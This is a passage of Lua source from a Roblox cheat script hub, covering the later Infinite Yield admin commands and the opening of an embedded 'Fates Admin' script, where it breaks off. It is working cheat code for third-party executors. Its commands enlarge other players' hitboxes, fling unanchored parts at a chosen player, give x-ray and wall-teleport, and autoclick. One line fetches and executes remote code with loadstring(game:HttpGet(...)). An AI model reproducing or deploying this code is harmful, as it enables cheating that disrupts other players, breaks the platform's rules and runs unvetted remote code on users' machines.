				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				teleport(speaker,Players[v],Players[players2[1]],true)
			end
		end
	end)

	addcmd('spin',{},function(args, speaker)
		local spinSpeed = 20
		if args[1] and isNumber(args[1]) then
			spinSpeed = args[1]
		end
		for i,v in pairs(getRoot(speaker.Character):GetChildren()) do
			if v.Name == "Spinning" then
				v:Destroy()
			end
		end
		local Spin = Instance.new("BodyAngularVelocity")
		Spin.Name = "Spinning"
		Spin.Parent = getRoot(speaker.Character)
		Spin.MaxTorque = Vector3.new(0, math.huge, 0)
		Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
	end)

	addcmd('unspin',{},function(args, speaker)
		for i,v in pairs(getRoot(speaker.Character):GetChildren()) do
			if v.Name == "Spinning" then
				v:Destroy()
			end
		end
	end)

	local transparent = false
	function x(v)
		if v then
			for _,i in pairs(workspace:GetDescendants()) do
				if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
					i.LocalTransparencyModifier = 0.5
				end
			end
		else
			for _,i in pairs(workspace:GetDescendants()) do
				if i:IsA("BasePart") and not i.Parent:FindFirstChild("Humanoid") and not i.Parent.Parent:FindFirstChild("Humanoid") then
					i.LocalTransparencyModifier = 0
				end
			end
		end
	end

	addcmd('xray',{},function(args, speaker)
		transparent = true
		x(transparent)
	end)

	addcmd('unxray',{'noxray'},function(args, speaker)
		transparent = false
		x(transparent)
	end)

	addcmd('togglexray',{},function(args, speaker)
		transparent=not transparent
		x(transparent)
	end)

	local walltpTouch = nil
	addcmd('walltp',{},function(args, speaker)
		local torso
		if r15(speaker) then
			torso = speaker.Character.UpperTorso
		else
			torso = speaker.Character.Torso
		end
		local function touchedFunc(hit)
			local Root = getRoot(speaker.Character)
			if hit:IsA("BasePart") and hit.Position.Y > Root.Position.Y - speaker.Character.Humanoid.HipHeight then
				local hitP = getRoot(hit.Parent)
				if hitP ~= nil then
					Root.CFrame = hit.CFrame * CFrame.new(Root.CFrame.lookVector.X,hitP.Size.Z/2 + speaker.Character.Humanoid.HipHeight,Root.CFrame.lookVector.Z)
				elseif hitP == nil then
					Root.CFrame = hit.CFrame * CFrame.new(Root.CFrame.lookVector.X,hit.Size.Y/2 + speaker.Character.Humanoid.HipHeight,Root.CFrame.lookVector.Z)
				end
			end
		end
		walltpTouch = torso.Touched:Connect(touchedFunc)
	end)

	addcmd('unwalltp',{'nowalltp'},function(args, speaker)
		if walltpTouch then
			walltpTouch:Disconnect()
		end
	end)

	autoclicking = false
	addcmd('autoclick',{},function(args, speaker)
		if mouse1press and mouse1release then
			execCmd('unautoclick')
			wait()
			local clickDelay = 0.1
			local releaseDelay = 0.1
			if args[1] and isNumber(args[1]) then clickDelay = args[1] end
			if args[2] and isNumber(args[2]) then releaseDelay = args[2] end
			autoclicking = true
			cancelAutoClick = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
				if not gameProcessedEvent then
					if (input.KeyCode == Enum.KeyCode.Backspace and UserInputService:IsKeyDown(Enum.KeyCode.Equals)) or (input.KeyCode == Enum.KeyCode.Equals and UserInputService:IsKeyDown(Enum.KeyCode.Backspace)) then
						autoclicking = false
						cancelAutoClick:Disconnect()
					end
				end
			end)
			notify('Auto Clicker',"Press [backspace] and [=] at the same time to stop")
			repeat wait(clickDelay)
				mouse1press()
				wait(releaseDelay)
				mouse1release()
			until autoclicking == false
		else
			notify('Auto Clicker',"Your exploit doesn't have the ability to use the autoclick")
		end
	end)

	addcmd('unautoclick',{'noautoclick'},function(args, speaker)
		autoclicking = false
		if cancelAutoClick then cancelAutoClick:Disconnect() end
	end)

	addcmd('mousesensitivity',{'ms'},function(args, speaker)
		UserInputService.MouseDeltaSensitivity = args[1]
	end)

	local nameBox = nil
	local nbSelection = nil
	addcmd('hovername',{},function(args, speaker)
		execCmd('unhovername')
		wait()
		nameBox = Instance.new("TextLabel")
		nameBox.Name = randomString()
		nameBox.Parent = PARENT
		nameBox.BackgroundTransparency = 1
		nameBox.Size = UDim2.new(0,200,0,30)
		nameBox.Font = Enum.Font.Code
		nameBox.TextSize = 16
		nameBox.Text = ""
		nameBox.TextColor3 = Color3.new(1, 1, 1)
		nameBox.TextStrokeTransparency = 0
		nameBox.TextXAlignment = Enum.TextXAlignment.Left
		nameBox.ZIndex = 10
		nbSelection = Instance.new('SelectionBox')
		nbSelection.Name = randomString()
		nbSelection.LineThickness = 0.03
		nbSelection.Color3 = Color3.new(1, 1, 1)
		local function updateNameBox()
			local t
			local target = IYMouse.Target

			if target then
				local humanoid = target.Parent:FindFirstChild('Humanoid') or target.Parent.Parent:FindFirstChild('Humanoid')
				if humanoid then
					t = humanoid.Parent
				end
			end

			if t ~= nil then
				local x = IYMouse.X
				local y = IYMouse.Y
				local xP
				local yP
				if IYMouse.X > 200 then
					xP = x - 205
					nameBox.TextXAlignment = Enum.TextXAlignment.Right
				else
					xP = x + 25
					nameBox.TextXAlignment = Enum.TextXAlignment.Left
				end
				nameBox.Position = UDim2.new(0, xP, 0, y)
				nameBox.Text = t.Name
				nameBox.Visible = true
				nbSelection.Parent = t
				nbSelection.Adornee = t
			else
				nameBox.Visible = false
				nbSelection.Parent = nil
				nbSelection.Adornee = nil
			end
		end
		nbUpdateFunc = IYMouse.Move:Connect(updateNameBox)
	end)

	addcmd('unhovername',{'nohovername'},function(args, speaker)
		if nbUpdateFunc then
			nbUpdateFunc:Disconnect()
			nameBox:Destroy()
			nbSelection:Destroy()
		end
	end)

	addcmd('hitbox',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			if Players[v]~= speaker and Players[v].Character:FindFirstChild('Head') then
				local sizeArg = tonumber(args[2])
				local Size = Vector3.new(sizeArg,sizeArg,sizeArg)
				local Head = Players[v].Character:FindFirstChild('Head')
				if Head:IsA("BasePart") then
					if not args[2] or sizeArg == 1 then
						Head.Size = Vector3.new(2,1,1)
					else
						Head.Size = Size
					end
				end
			end
		end
	end)

	addcmd('stareat',{'stare'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			if stareLoop then
				stareLoop:Disconnect()
			end
			if not Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and Players[v].Character:FindFirstChild("HumanoidRootPart") then return end
			local function stareFunc()
				if Players.LocalPlayer.Character.PrimaryPart and Players:FindFirstChild(v) and Players[v].Character ~= nil and Players[v].Character:FindFirstChild("HumanoidRootPart") then
					local chrPos=Players.LocalPlayer.Character.PrimaryPart.Position
					local tPos=Players[v].Character:FindFirstChild("HumanoidRootPart").Position
					local modTPos=Vector3.new(tPos.X,chrPos.Y,tPos.Z)
					local newCF=CFrame.new(chrPos,modTPos)
					Players.LocalPlayer.Character:SetPrimaryPartCFrame(newCF)
				elseif not Players:FindFirstChild(v) then
					stareLoop:Disconnect()
				end
			end

			stareLoop = game:GetService("RunService").RenderStepped:Connect(stareFunc)
		end
	end)

	addcmd('unstareat',{'unstare','nostare','nostareat'},function(args, speaker)
		if stareLoop then
			stareLoop:Disconnect()
		end
	end)

	addcmd('removeterrain',{'rterrain','noterrain'},function(args, speaker)
		workspace:FindFirstChildOfClass('Terrain'):Clear()
	end)

	addcmd('clearnilinstances',{'nonilinstances','cni'},function(args, speaker)
		if getnilinstances then
			for i,v in pairs(getnilinstances()) do
				v:Destroy()
			end
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing getnilinstances)')
		end
	end)

	addcmd('destroyheight',{'dh'},function(args, speaker)
		local dh = args[1] or -500
		if isNumber(dh) then
			workspace.FallenPartsDestroyHeight = dh
		end
	end)

	local freezingua = nil
	frozenParts = {}
	addcmd('freezeunanchored',{'freezeua'},function(args, speaker)
		if sethidden then
			local badnames = {
				"Head",
				"UpperTorso",
				"LowerTorso",
				"RightUpperArm",
				"LeftUpperArm",
				"RightLowerArm",
				"LeftLowerArm",
				"RightHand",
				"LeftHand",
				"RightUpperLeg",
				"LeftUpperLeg",
				"RightLowerLeg",
				"LeftLowerLeg",
				"RightFoot",
				"LeftFoot",
				"Torso",
				"Right Arm",
				"Left Arm",
				"Right Leg",
				"Left Leg",
				"HumanoidRootPart"
			}
			local function FREEZENOOB(v)
				if v:IsA("BasePart" or "UnionOperation") and v.Anchored == false then
					local BADD = false
					for i = 1,#badnames do
						if v.Name == badnames[i] then
							BADD = true
						end
					end
					if speaker.Character and v:IsDescendantOf(speaker.Character) then
						BADD = true
					end
					if BADD == false then
						for i,c in pairs(v:GetChildren()) do
							if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
								c:Destroy()
							end
						end
						if not simRadius then
							execCmd('simulationradius')
						end
						local bodypos = Instance.new("BodyPosition")
						bodypos.Parent = v
						bodypos.Position = v.Position
						bodypos.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
						local bodygyro = Instance.new("BodyGyro")
						bodygyro.Parent = v
						bodygyro.CFrame = v.CFrame
						bodygyro.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
						if not table.find(frozenParts,v) then
							table.insert(frozenParts,v)
						end
					end
				end
			end
			for i,v in pairs(workspace:GetDescendants()) do
				FREEZENOOB(v)
			end
			freezingua = workspace.DescendantAdded:Connect(FREEZENOOB)
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('thawunanchored',{'thawua','unfreezeunanchored','unfreezeua'},function(args, speaker)
		if sethidden then
			if freezingua then
				freezingua:Disconnect()
			end
			if not simRadius then
				execCmd('simulationradius')
			end
			for i,v in pairs(frozenParts) do
				for i,c in pairs(v:GetChildren()) do
					if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
						c:Destroy()
					end
				end
			end
			frozenParts = {}
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('tpunanchored',{'tpua'},function(args, speaker)
		if sethidden then
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				local Forces = {}
				for _,part in pairs(workspace:GetDescendants()) do
					if Players[v].Character:FindFirstChild('Head') and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(speaker.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
						for i,c in pairs(part:GetChildren()) do
							if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
								c:Destroy()
							end
						end
						local ForceInstance = Instance.new("BodyPosition")
						ForceInstance.Parent = part
						ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
						table.insert(Forces, ForceInstance)
						if not table.find(frozenParts,part) then
							table.insert(frozenParts,part)
						end
					end
				end
				if not simRadius then
					execCmd('simulationradius')
				end
				for i,c in pairs(Forces) do
					c.Position = Players[v].Character.Head.Position
				end
			end
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	keycodeMap = {
		["0"] = 0x30,
		["1"] = 0x31,
		["2"] = 0x32,
		["3"] = 0x33,
		["4"] = 0x34,
		["5"] = 0x35,
		["6"] = 0x36,
		["7"] = 0x37,
		["8"] = 0x38,
		["9"] = 0x39,
		["a"] = 0x41,
		["b"] = 0x42,
		["c"] = 0x43,
		["d"] = 0x44,
		["e"] = 0x45,
		["f"] = 0x46,
		["g"] = 0x47,
		["h"] = 0x48,
		["i"] = 0x49,
		["j"] = 0x4A,
		["k"] = 0x4B,
		["l"] = 0x4C,
		["m"] = 0x4D,
		["n"] = 0x4E,
		["o"] = 0x4F,
		["p"] = 0x50,
		["q"] = 0x51,
		["r"] = 0x52,
		["s"] = 0x53,
		["t"] = 0x54,
		["u"] = 0x55,
		["v"] = 0x56,
		["w"] = 0x57,
		["x"] = 0x58,
		["y"] = 0x59,
		["z"] = 0x5A,
		["enter"] = 0x0D,
		["shift"] = 0x10,
		["ctrl"] = 0x11,
		["alt"] = 0x12,
		["pause"] = 0x13,
		["capslock"] = 0x14,
		["spacebar"] = 0x20,
		["pageup"] = 0x21,
		["pagedown"] = 0x22,
		["end"] = 0x23,
		["home"] = 0x24,
		["left"] = 0x25,
		["up"] = 0x26,
		["right"] = 0x27,
		["down"] = 0x28,
		["insert"] = 0x2D,
		["delete"] = 0x2E,
		["f1"] = 0x70,
		["f2"] = 0x71,
		["f3"] = 0x72,
		["f4"] = 0x73,
		["f5"] = 0x74,
		["f6"] = 0x75,
		["f7"] = 0x76,
		["f8"] = 0x77,
		["f9"] = 0x78,
		["f10"] = 0x79,
		["f11"] = 0x7A,
		["f12"] = 0x7B,
	}
	autoKeyPressing = false
	cancelAutoKeyPress = nil

	addcmd('autokeypress',{'keypress'},function(args, speaker)
		if keypress and keyrelease and args[1] then
			local code = keycodeMap[args[1]:lower()]
			if not code then notify('Auto Key Press',"Invalid key") return end
			execCmd('unautokeypress')
			wait()
			local clickDelay = 0.1
			local releaseDelay = 0.1
			if args[2] and isNumber(args[2]) then clickDelay = args[2] end
			if args[3] and isNumber(args[3]) then releaseDelay = args[3] end
			autoKeyPressing = true
			cancelAutoKeyPress = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
				if not gameProcessedEvent then
					if (input.KeyCode == Enum.KeyCode.Backspace and UserInputService:IsKeyDown(Enum.KeyCode.Equals)) or (input.KeyCode == Enum.KeyCode.Equals and UserInputService:IsKeyDown(Enum.KeyCode.Backspace)) then
						autoKeyPressing = false
						cancelAutoKeyPress:Disconnect()
					end
				end
			end)
			notify('Auto Key Press',"Press [backspace] and [=] at the same time to stop")
			repeat wait(clickDelay)
				keypress(code)
				wait(releaseDelay)
				keyrelease(code)
			until autoKeyPressing == false
			if cancelAutoKeyPress then cancelAutoKeyPress:Disconnect() keyrelease(code) end
		else
			notify('Auto Key Press',"Your exploit doesn't have the ability to use auto key press")
		end
	end)

	addcmd('unautokeypress',{'noautokeypress','unkeypress','nokeypress'},function(args, speaker)
		autoKeyPressing = false
		if cancelAutoKeyPress then cancelAutoKeyPress:Disconnect() end
	end)

	addcmd('addplugin',{'plugin'},function(args, speaker)
		addPlugin(getstring(1))
	end)

	addcmd('removeplugin',{'deleteplugin'},function(args, speaker)
		deletePlugin(getstring(1))
	end)

	addcmd('reloadplugin',{},function(args, speaker)
		local pluginName = getstring(1)
		deletePlugin(pluginName)
		wait(1)
		addPlugin(pluginName)
	end)

	addcmd('removecmd',{'deletecmd'},function(args, speaker)
		removecmd(args[1])
	end)

	updateColors(currentShade1,shade1)
	updateColors(currentShade2,shade2)
	updateColors(currentShade3,shade3)
	updateColors(currentText1,text1)
	updateColors(currentText2,text2)
	updateColors(currentScroll,scroll)

	if PluginsTable ~= nil or PluginsTable ~= {} then
		FindPlugins(PluginsTable)
	end

	-- Events
	eventEditor.RegisterEvent("OnExecute")
	eventEditor.RegisterEvent("OnSpawn",{
		{Type="Player",Name="Player Filter ($1)"}
	})
	eventEditor.RegisterEvent("OnDied",{
		{Type="Player",Name="Player Filter ($1)"}
	})
	eventEditor.RegisterEvent("OnDamage",{
		{Type="Player",Name="Player Filter ($1)"},
		{Type="Number",Name="Below Health ($2)"}
	})
	eventEditor.RegisterEvent("OnKilled",{
		{Type="Player",Name="Victim Player ($1)"},
		{Type="Player",Name="Killer Player ($2)",Default = 1}
	})
	eventEditor.RegisterEvent("OnJoin",{
		{Type="Player",Name="Player Filter ($1)",Default = 1}
	})
	eventEditor.RegisterEvent("OnChatted",{
		{Type="Player",Name="Player Filter ($1)",Default = 1},
		{Type="String",Name="Message Filter ($2)"}
	})

	function hookCharEvents(plr,instant)
		spawn(function()
			local char = plr.Character
			if not char then return end

			local humanoid = char:WaitForChild("Humanoid",10)
			if not humanoid then return end

			local oldHealth = humanoid.Health
			humanoid.HealthChanged:Connect(function(health)
				local change = math.abs(oldHealth - health)
				if oldHealth > health then
					eventEditor.FireEvent("OnDamage",plr.Name,tonumber(health))
				end
				oldHealth = health
			end)

			humanoid.Died:Connect(function()
				eventEditor.FireEvent("OnDied",plr.Name)

				local killedBy = humanoid:FindFirstChild("creator")
				if killedBy and killedBy.Value and killedBy.Value.Parent then
					eventEditor.FireEvent("OnKilled",plr.Name,killedBy.Name)
				end
			end)
		end)
	end

	Players.PlayerAdded:Connect(function(plr)
		eventEditor.FireEvent("OnJoin",plr.Name)
		plr.Chatted:Connect(function(msg) eventEditor.FireEvent("OnChatted",tostring(plr),msg) end)
		plr.CharacterAdded:Connect(function() eventEditor.FireEvent("OnSpawn",tostring(plr)) hookCharEvents(plr) end)
		JoinLog(plr)
		ChatLog(plr)
		if ESPenabled then
			repeat wait(1) until plr.Character and getRoot(plr.Character)
			ESP(plr)
		end
		if CHMSenabled then
			repeat wait(1) until plr.Character and getRoot(plr.Character)
			CHMS(plr)
		end
	end)

	for _,plr in pairs(Players:GetPlayers()) do
		pcall(function()
			plr.Chatted:Connect(function(msg) eventEditor.FireEvent("OnChatted",tostring(plr),msg) end)
			plr.CharacterAdded:Connect(function() eventEditor.FireEvent("OnSpawn",tostring(plr)) hookCharEvents(plr) end)
			hookCharEvents(plr)
		end)
	end

	if spawnCmds and #spawnCmds > 0 then
		for i,v in pairs(spawnCmds) do
			eventEditor.AddCmd("OnSpawn",{v.COMMAND or "",{0},v.DELAY or 0})
		end
		updatesaves()
	end

	if loadedEventData then eventEditor.LoadData(loadedEventData) end
	eventEditor.Refresh()

	eventEditor.FireEvent("OnExecute")

	if aliases and #aliases > 0 then
		local cmdMap = {}
		for i,v in pairs(cmds) do
			cmdMap[v.NAME:lower()] = v
			for _,alias in pairs(v.ALIAS) do
				cmdMap[alias:lower()] = v
			end
		end
		for i = 1, #aliases do
			local cmd = string.lower(aliases[i].CMD)
			local alias = string.lower(aliases[i].ALIAS)
			if cmdMap[cmd] then
				customAlias[alias] = cmdMap[cmd]
			end
		end
		refreshaliases()
	end

	IYMouse.Move:Connect(checkTT)

	spawn(function()
		if pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/version'))() end) then
			if ver ~= Version then
				notify('Outdated','Get the new version at infyield.yolasite.com')
			end
			if Announcement and Announcement ~= '' then
				local AnnGUI = Instance.new("Frame")
				local background = Instance.new("Frame")
				local TextBox = Instance.new("TextLabel")
				local shadow = Instance.new("Frame")
				local PopupText = Instance.new("TextLabel")
				local Exit = Instance.new("TextButton")
				local ExitImage = Instance.new("ImageLabel")

				AnnGUI.Name = randomString()
				AnnGUI.Parent = PARENT
				AnnGUI.Active = true
				AnnGUI.BackgroundTransparency = 1
				AnnGUI.Position = UDim2.new(0.5, -180, 0, -500)
				AnnGUI.Size = UDim2.new(0, 360, 0, 20)
				AnnGUI.ZIndex = 10

				background.Name = "background"
				background.Parent = AnnGUI
				background.Active = true
				background.BackgroundColor3 = currentShade1
				background.BorderSizePixel = 0
				background.Position = UDim2.new(0, 0, 0, 20)
				background.Size = UDim2.new(0, 360, 0, 150)
				background.ZIndex = 10

				TextBox.Parent = background
				TextBox.BackgroundTransparency = 1
				TextBox.Position = UDim2.new(0, 5, 0, 5)
				TextBox.Size = UDim2.new(0, 350, 0, 140)
				TextBox.Font = Enum.Font.SourceSans
				TextBox.TextSize = 18
				TextBox.TextWrapped = true
				TextBox.Text = Announcement
				TextBox.TextColor3 = currentText1
				TextBox.TextXAlignment = Enum.TextXAlignment.Left
				TextBox.TextYAlignment = Enum.TextYAlignment.Top
				TextBox.ZIndex = 10

				shadow.Name = "shadow"
				shadow.Parent = AnnGUI
				shadow.BackgroundColor3 = currentShade2
				shadow.BorderSizePixel = 0
				shadow.Size = UDim2.new(0, 360, 0, 20)
				shadow.ZIndex = 10

				PopupText.Name = "PopupText"
				PopupText.Parent = shadow
				PopupText.BackgroundTransparency = 1
				PopupText.Size = UDim2.new(1, 0, 0.95, 0)
				PopupText.ZIndex = 10
				PopupText.Font = Enum.Font.SourceSans
				PopupText.TextSize = 14
				PopupText.Text = "Server Announcement"
				PopupText.TextColor3 = currentText1
				PopupText.TextWrapped = true

				Exit.Name = "Exit"
				Exit.Parent = shadow
				Exit.BackgroundTransparency = 1
				Exit.Position = UDim2.new(1, -20, 0, 0)
				Exit.Size = UDim2.new(0, 20, 0, 20)
				Exit.Text = ""
				Exit.ZIndex = 10

				ExitImage.Parent = Exit
				ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
				ExitImage.BackgroundTransparency = 1
				ExitImage.Position = UDim2.new(0, 5, 0, 5)
				ExitImage.Size = UDim2.new(0, 10, 0, 10)
				ExitImage.Image = "rbxassetid://5054663650"
				ExitImage.ZIndex = 10

				wait(1)
				AnnGUI:TweenPosition(UDim2.new(0.5, -180, 0, 150), "InOut", "Quart", 0.5, true, nil)

				Exit.MouseButton1Click:Connect(function()
					AnnGUI:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
					wait(0.6)
					AnnGUI:Destroy()
				end)
			end
		end
	end)

	wait()
	Credits:TweenPosition(UDim2.new(0,0,0.9,0), "Out", "Quart", 0.2)
	Logo:TweenSizeAndPosition(UDim2.new(0,175,0,175),UDim2.new(0,37,0,45), "Out", "Quart", 0.3)
	wait(1)
	for i=0,1,0.1 do
		Logo.ImageTransparency = i
		IntroBackground.BackgroundTransparency = i
		wait()
	end
	Credits:TweenPosition(UDim2.new(0,0,0.9,30), "Out", "Quart", 0.2)
	wait(0.2)
	Logo:Destroy()
	Credits:Destroy()
	IntroBackground:Destroy()
	minimizeHolder()
end)

UICorner_51.Parent = InfiniteYield

FateAdmin.Name = "FateAdmin"
FateAdmin.Parent = Scripts
FateAdmin.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FateAdmin.Position = UDim2.new(0.565737069, 0, 0.628222823, 0)
FateAdmin.Size = UDim2.new(0, 71, 0, 50)
FateAdmin.Font = Enum.Font.SciFi
FateAdmin.Text = "Fates Admin"
FateAdmin.TextColor3 = Color3.fromRGB(0, 0, 0)
FateAdmin.TextScaled = true
FateAdmin.TextSize = 14.000
FateAdmin.TextWrapped = true
FateAdmin.MouseButton1Click:connect(function()
	--[[
	fates admin - 8/2/2022
]]

	local game = game
	local GetService = game.GetService
	if (not game.IsLoaded(game)) then
		local Loaded = game.Loaded
		Loaded.Wait(Loaded);
	end

	local _L = {}

	_L.start = start or tick();
	local Debug = true

	do
		local F_A = getgenv().F_A
		if (F_A) then
			local Notify, GetConfig = F_A.Utils.Notify, F_A.GetConfig
			local UserInputService = GetService(game, "UserInputService");
			local CommandBarPrefix = GetConfig().CommandBarPrefix
			local StringKeyCode = UserInputService.GetStringForKeyCode(UserInputService, Enum.KeyCode[CommandBarPrefix]);
			return Notify(nil, "Loaded", "fates admin is already loaded... use 'killscript' to kill", nil),
			Notify(nil, "Your Prefix is", string.format("%s (%s)", StringKeyCode, CommandBarPrefix));
		end
	end

	--IMPORT [var]
	local Services = {
		Workspace = GetService(game, "Workspace");
		UserInputService = GetService(game, "UserInputService");
		ReplicatedStorage = GetService(game, "ReplicatedStorage");
		StarterPlayer = GetService(game, "StarterPlayer");
		StarterPack = GetService(game, "StarterPack");
		StarterGui = GetService(game, "StarterGui");
		TeleportService = GetService(game, "TeleportService");
		CoreGui = GetService(game, "CoreGui");
		TweenService = GetService(game, "TweenService");
		HttpService = GetService(game, "HttpService");
		TextService = GetService(game, "TextService");
		MarketplaceService = GetService(game, "MarketplaceService");
		Chat = GetService(game, "Chat");
		Teams = GetService(game, "Teams");
		SoundService = GetService(game, "SoundService");
		Lighting = GetService(game, "Lighting");
		ScriptContext = GetService(game, "ScriptContext");
		Stats = GetService(game, "Stats");
	}

	setmetatable(Services, {
		__index = function(Table, Property)
			local Ret, Service = pcall(GetService, game, Property);
			if (Ret) then
				Services[Property] = Service
				return Service
			end
			return nil
		end,
		__mode = "v"
	});

	local GetChildren, GetDescendants = game.GetChildren, game.GetDescendants
	local IsA = game.IsA
	local FindFirstChild, FindFirstChildOfClass, FindFirstChildWhichIsA, WaitForChild = 
		game.FindFirstChild,
	game.FindFirstChildOfClass,
	game.FindFirstChildWhichIsA,
	game.WaitForChild

	local GetPropertyChangedSignal, Changed = 
		game.GetPropertyChangedSignal,
	game.Changed

	local Destroy, Clone = game.Destroy, game.Clone

	local Heartbeat, Stepped, RenderStepped;
	do
		local RunService = Services.RunService;
		Heartbeat, Stepped, RenderStepped =
			RunService.Heartbeat,
		RunService.Stepped,
		RunService.RenderStepped
	end

	local Players = Services.Players
	local GetPlayers = Players.GetPlayers

	local JSONEncode, JSONDecode, GenerateGUID = 
		Services.HttpService.JSONEncode, 
	Services.HttpService.JSONDecode,
	Services.HttpService.GenerateGUID

	local Camera = Services.Workspace.CurrentCamera

	local Tfind, sort, concat, pack, unpack;
	do
		local table = table
		Tfind, sort, concat, pack, unpack = 
			table.find, 
		table.sort,
		table.concat,
		table.pack,
		table.unpack
	end

	local lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte;
	do
		local string = string
		lower, upper, Sfind, split, sub, format, len, match, gmatch, gsub, byte = 
			string.lower,
		string.upper,
		string.find,
		string.split, 
		string.sub,
		string.format,
		string.len,
		string.match,
		string.gmatch,
		string.gsub,
		string.byte
	end

	local random, floor, round, abs, atan, cos, sin, rad;
	do
		local math = math
		random, floor, round, abs, atan, cos, sin, rad = 
			math.random,
		math.floor,
		math.round,
		math.abs,
		math.atan,
		math.cos,
		math.sin,
		math.rad
	end

	local InstanceNew = Instance.new
	local CFrameNew = CFrame.new
	local Vector3New = Vector3.new

	local Inverse, toObjectSpace, components
	do
		local CalledCFrameNew = CFrameNew();
		Inverse = CalledCFrameNew.Inverse
		toObjectSpace = CalledCFrameNew.toObjectSpace
		components = CalledCFrameNew.components
	end

	local Connection = game.Loaded
	local CWait = Connection.Wait
	local CConnect = Connection.Connect

	local Disconnect;
	do
		local CalledConnection = CConnect(Connection, function() end);
		Disconnect = CalledConnection.Disconnect
	end

	local __H = InstanceNew("Humanoid");
	local UnequipTools = __H.UnequipTools
	local ChangeState = __H.ChangeState
	local SetStateEnabled = __H.SetStateEnabled
	local GetState = __H.GetState
	local GetAccessories = __H.GetAccessories

	local LocalPlayer = Players.LocalPlayer
	local PlayerGui = LocalPlayer.PlayerGui
	local Mouse = LocalPlayer.GetMouse(LocalPlayer);

	local CThread;
	do
		local wrap = coroutine.wrap
		CThread = function(Func, ...)
			if (type(Func) ~= 'function') then
				return nil
			end
			local Varag = ...
			return function()
				local Success, Ret = pcall(wrap(Func, Varag));
				if (Success) then
					return Ret
				end
				if (Debug) then
					warn("[FA Error]: " .. debug.traceback(Ret));
				end
			end
		end
	end

	local startsWith = function(str, searchString, rawPos)
		local pos = rawPos or 1
		return searchString == "" and true or sub(str, pos, pos) == searchString
	end

	local trim = function(str)
		return gsub(str, "^%s*(.-)%s*$", "%1");
	end

	local tbl_concat = function(...)
		local new = {}
		for i, v in next, {...} do
			for i2, v2 in next, v do
				new[i] = v2
			end
		end
		return new
	end

	local indexOf = function(tbl, val)
		if (type(tbl) == 'table') then
			for i, v in next, tbl do
				if (v == val) then
					return i
				end
			end
		end
	end

	local forEach = function(tbl, ret)
		for i, v in next, tbl do
			ret(i, v);
		end
	end

	local filter = function(tbl, ret)
		if (type(tbl) == 'table') then
			local new = {}
			for i, v in next, tbl do
				if (ret(i, v)) then
					new[#new + 1] = v
				end
			end
			return new
		end
	end

	local map = function(tbl, ret)
		if (type(tbl) == 'table') then
			local new = {}
			for i, v in next, tbl do
				local Value, Key = ret(i, v);
				new[Key or #new + 1] = Value
			end
			return new
		end
	end

	local deepsearch;
	deepsearch = function(tbl, ret)
		if (type(tbl) == 'table') then
			for i, v in next, tbl do
				if (type(v) == 'table') then
					deepsearch(v, ret);
				end
				ret(i, v);
			end
		end
	end

	local deepsearchset;
	deepsearchset = function(tbl, ret, value)
		if (type(tbl) == 'table') then
			local new = {}
			for i, v in next, tbl do
				new[i] = v
				if (type(v) == 'table') then
					new[i] = deepsearchset(v, ret, value);
				end
				if (ret(i, v)) then
					new[i] = value(i, v);
				end
			end
			return new
		end
	end

	local flat = function(tbl)
		if (type(tbl) == 'table') then
			local new = {}
			deepsearch(tbl, function(i, v)
				if (type(v) ~= 'table') then
					new[#new + 1] = v
				end
			end)
			return new
		end
	end

	local flatMap = function(tbl, ret)
		if (type(tbl) == 'table') then
			local new = flat(map(tbl, ret));
			return new
		end
	end

	local shift = function(tbl)
		if (type(tbl) == 'table') then
			local firstVal = tbl[1]
			tbl = pack(unpack(tbl, 2, #tbl));
			tbl.n = nil
			return tbl
		end
	end

	local keys = function(tbl)
		if (type(tbl) == 'table') then
			local new = {}
			for i, v in next, tbl do
				new[#new + 1] = i	
			end
			return new
		end
	end

	local function clone(toClone, shallow)
		if (type(toClone) == 'function' and clonefunction) then
			return clonefunction(toClone);
		end
		local new = {}
		for i, v in pairs(toClone) do
			if (type(v) == 'table' and not shallow) then
				v = clone(v);
			end
			new[i] = v
		end
		return new
	end

	local setthreadidentity = setthreadidentity or syn_context_set or setthreadcontext
	local getthreadidentity = getthreadidentity or syn_context_get or getthreadcontext
	--END IMPORT [var]



	local GetCharacter = GetCharacter or function(Plr)
		return Plr and Plr.Character or LocalPlayer.Character
	end

	local Utils = {}

	--IMPORT [extend]
	local SocialService = game:GetService("SocialService")
	local firetouchinterest, hookfunction, getconnections;
	do
		local GEnv = getgenv();
		local touched = {}
		firetouchinterest = GEnv.firetouchinterest or function(part1, part2, toggle)
			if (part1 and part2) then
				if (toggle == 0) then
					touched[1] = part1.CFrame
